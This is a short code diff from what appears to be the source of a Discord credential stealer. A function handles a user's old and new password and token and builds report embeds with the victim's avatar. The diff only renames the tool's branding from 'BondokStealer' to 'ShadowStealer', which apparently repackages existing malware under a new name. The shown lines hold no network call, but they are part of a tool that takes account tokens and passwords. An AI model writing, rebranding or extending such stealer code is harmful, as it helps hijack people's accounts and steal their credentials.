@@ -844,10 +844,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 										inline: !1
 									}, ],
 									"author": {
-										"name": "BondokStealer"
+										"name": "ShadowStealer"
 									},
 									"footer": {
-										"text": "BondokStealer"
+										"text": "ShadowStealer"
 									},
 									"thumbnail": {
 										"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -873,10 +873,10 @@ function ChangePassword(oldpassword, newpassword, token) {
 								"color": config['embed-color'],
 								"fields": fieldo,
 								"author": {
-									"name": "BondokStealer"
+									"name": "ShadowStealer"
 								},
 								"footer": {
-									"text": "BondokStealer"
+									"text": "ShadowStealer"
 								}
 							}
 							if (token.startsWith("mfa")) {
